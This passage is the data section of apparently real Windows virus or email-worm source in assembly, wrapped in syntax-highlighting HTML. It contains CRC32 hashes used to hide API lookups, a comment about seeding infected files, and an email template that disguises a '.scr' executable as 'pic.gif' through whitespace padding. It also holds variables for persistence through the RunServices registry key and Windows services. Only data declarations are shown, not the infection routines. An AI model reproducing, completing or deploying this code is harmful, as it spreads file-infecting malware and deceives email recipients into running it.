</span><span class="sc5">CRC__CreateFileMappingA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0d094d7c4h</span><span class="sc0">
</span><span class="sc5">CRC__CreateProcessA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0307d6f2h</span><span class="sc0">
</span><span class="sc5">CRC__CreateThread</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0d15770bah</span><span class="sc0">
</span><span class="sc5">CRC__DebugActiveProcess</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0b00173d4h</span><span class="sc0">
</span><span class="sc5">CRC__DuplicateHandle</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0d42bfe3bh</span><span class="sc0">
</span><span class="sc5">CRC__ExitProcess</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0f2205a14h</span><span class="sc0">
</span><span class="sc5">CRC__ExitThread</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">60479e16h</span><span class="sc0">
</span><span class="sc5">CRC__FindClose</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0ac76f1beh</span><span class="sc0">
</span><span class="sc5">CRC__FindFirstFileA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0cfbc4377h</span><span class="sc0">
</span><span class="sc5">CRC__FindNextFileA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">99306305h</span><span class="sc0">
</span><span class="sc5">CRC__FlushInstructionCache</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">9e14a5bch</span><span class="sc0">
</span><span class="sc5">CRC__FreeLibrary</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0acf0d283h</span><span class="sc0">
</span><span class="sc5">CRC__GetCommandLineA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">2ca614d3h</span><span class="sc0">
</span><span class="sc5">CRC__GetComputerNameA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">3bd1499ah</span><span class="sc0">
</span><span class="sc5">CRC__GetCurrentProcess</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">64ddd496h</span><span class="sc0">
</span><span class="sc5">CRC__GetCurrentProcessId</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">84120each</span><span class="sc0">
</span><span class="sc5">CRC__GetModuleFileNameA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0b82d2052h</span><span class="sc0">
</span><span class="sc5">CRC__GetSystemDirectoryA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">286e0808h</span><span class="sc0">
</span><span class="sc5">CRC__GetThreadContext</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0d896c904h</span><span class="sc0">
</span><span class="sc5">CRC__GetVersionExA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0b1c4fe5ah</span><span class="sc0">
</span><span class="sc5">CRC__LoadLibraryA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0c9f5452dh</span><span class="sc0">
</span><span class="sc5">CRC__MapViewOfFile</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">75706cffh</span><span class="sc0">
</span><span class="sc5">CRC__ReadProcessMemory</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0dc4557b7h</span><span class="sc0">
</span><span class="sc5">CRC__SetThreadContext</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0ab04c022h</span><span class="sc0">
</span><span class="sc5">CRC__Sleep</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">076cf6efh</span><span class="sc0">
</span><span class="sc5">CRC__UnmapViewOfFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">07d68ea4h</span><span class="sc0">
</span><span class="sc5">CRC__VirtualAlloc</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0f31cc1d2h</span><span class="sc0">
</span><span class="sc5">CRC__VirtualFree</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">11e89c50h</span><span class="sc0">
</span><span class="sc5">CRC__WaitForDebugEvent</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0e378a217h</span><span class="sc0">
</span><span class="sc5">CRC__WaitForSingleObject</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">97580987h</span><span class="sc0">
</span><span class="sc5">CRC__WriteFile</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0b099498h</span><span class="sc0">
</span><span class="sc5">CRC__WriteProcessMemory</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0b2e10e52h</span><span class="sc0">

</span><span class="sc5">CRC__RegisterServiceProcess</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0d9cd1eeah</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">CrcApisUSER32</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">CRC__EnumWindows</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">65ac280ch</span><span class="sc0">
</span><span class="sc5">CRC__GetClassNameA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">5e305eb5h</span><span class="sc0">
</span><span class="sc5">CRC__GetWindowThreadProcessId</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0b8e54692h</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">CrcApisADVAPI32_nt</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">CRC__CloseServiceHandle</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">7745e0f1h</span><span class="sc0">
</span><span class="sc5">CRC__CreateServiceA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">001d5e71h</span><span class="sc0">
</span><span class="sc5">CRC__OpenSCManagerA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0b4a565dch</span><span class="sc0">
</span><span class="sc5">CRC__OpenServiceA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0b103fc09h</span><span class="sc0">
</span><span class="sc5">CRC__RegisterServiceCtrlHandlerA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0b210319eh</span><span class="sc0">
</span><span class="sc5">CRC__SetServiceStatus</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0f5c019c2h</span><span class="sc0">
</span><span class="sc5">CRC__StartServiceA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">09b8536ah</span><span class="sc0">
</span><span class="sc5">CRC__StartServiceCtrlDispatcherA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">9e784a71h</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">CrcApisADVAPI32_w9x</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">CRC__RegOpenKeyExA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0b49c2ffch</span><span class="sc0">
</span><span class="sc5">CRC__RegSetValueExA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">90677e0eh</span><span class="sc0">
</span><span class="sc5">CRC__RegCloseKey</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0b6fd65f0h</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">CrcApisWSOCK32</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">CRC_send</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0d758339eh</span><span class="sc0">
</span><span class="sc5">CRC_recv</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">67e929feh</span><span class="sc0">
</span><span class="sc5">CRC_WSAStartup</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00df5c22h</span><span class="sc0">
</span><span class="sc5">CRC_WSACleanup</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">7c8a120fh</span><span class="sc0">
</span><span class="sc5">CRC_ioctlsocket</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">974bf8f4h</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">e__DATA</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
                
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">

</span><span class="sc5">SizeOf__DATA</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">e__DATA</span><span class="sc0">

</span><span class="sc5">e__BODY</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Subject: pic.gif'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">' '</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.scr'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MIME-Version: 1.0'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Type: image/gif; charset=us-ascii'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Content-Transfer-Encoding: base64'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">

</span><span class="sc5">SizeOf__BODY</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">e__BODY</span><span class="sc0">

</span><span class="sc5">e__DOT</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">

</span><span class="sc5">SizeOf__DOT</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">e__DOT</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;Save the seed into infected files</span><span class="sc0">

</span><span class="sc5">SeedRND</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc1">;########################################################################################################################################################</span><span class="sc0">

                </span><span class="sc1">;Handle to KERNEL32 module</span><span class="sc0">

</span><span class="sc5">hKERNEL32</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc1">;KERNEL32 apis</span><span class="sc0">

</span><span class="sc5">EpApisKERNEL32</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">a_CloseHandle</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_ContinueDebugEvent</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_CopyFileA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_CreateFileA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_CreateFileMappingA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_CreateProcessA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_CreateThread</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_DebugActiveProcess</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_DuplicateHandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_ExitProcess</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_ExitThread</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_FindClose</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_FindFirstFileA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_FindNextFileA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_FlushInstructionCache</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_FreeLibrary</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetCommandLineA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetComputerNameA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetCurrentProcess</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetCurrentProcessId</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetModuleFileNameA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetSystemDirectoryA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetThreadContext</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetVersionExA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_LoadLibraryA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_MapViewOfFile</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_ReadProcessMemory</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_SetThreadContext</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_Sleep</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_UnmapViewOfFile</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_VirtualAlloc</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_VirtualFree</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_WaitForDebugEvent</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_WaitForSingleObject</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_WriteFile</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_WriteProcessMemory</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">NumKERNEL32</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EpApisKERNEL32</span><span class="sc4">)/</span><span class="sc2">04h</span><span class="sc0">

</span><span class="sc5">a_RegisterServiceProcess</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;CRC32 lookup table used to speed up checksum</span><span class="sc0">
                </span><span class="sc1">;calculation</span><span class="sc0">

</span><span class="sc5">CRC32LookupTable</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00000000h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;Buffer used for generic string manipulation</span><span class="sc0">

</span><span class="sc5">StringBuffer</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;########################################################################################################################################################</span><span class="sc0">

</span><span class="sc5">hUSER32</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">EpApisUSER32</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">a_EnumWindows</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetClassNameA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_GetWindowThreadProcessId</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">NumUSER32</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EpApisUSER32</span><span class="sc4">)/</span><span class="sc2">04h</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">hADVAPI32</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">EpApisADVAPI32_nt</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">a_CloseServiceHandle</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_CreateServiceA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_OpenSCManagerA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_OpenServiceA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_RegisterServiceCtrlHandlerA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_SetServiceStatus</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_StartServiceA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_StartServiceCtrlDispatcherA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">NumADVAPI32_nt</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EpApisADVAPI32_nt</span><span class="sc4">)/</span><span class="sc2">04h</span><span class="sc0">

</span><span class="sc5">EpApisADVAPI32_w9x</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">a_RegOpenKeyExA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_RegSetValueExA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_RegCloseKey</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">NumADVAPI32_w9x</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EpApisADVAPI32_w9x</span><span class="sc4">)/</span><span class="sc2">04h</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">CRC__Winsock</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">hWSOCK32</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">EpApisWSOCK32</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">a_send</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_recv</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_WSAStartup</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_WSACleanup</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">a_ioctlsocket</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">NumWSOCK32</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EpApisWSOCK32</span><span class="sc4">)/</span><span class="sc2">04h</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">BASE64__encoded</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">BASE64__lines</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;Bytes read by ReadProcessMemory</span><span class="sc0">

</span><span class="sc5">RPM_BytesRead</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc1">;Bytes written by WriteProcessMemory</span><span class="sc0">

</span><span class="sc5">WPM_BytesWritten</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;Flag used on debug thread</span><span class="sc0">

</span><span class="sc5">Is1StTimeDebugThread</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Vars used by w9x residency routines</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">hKey__RunServices</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Vars used by Nt residency routines</span><span class="sc0">
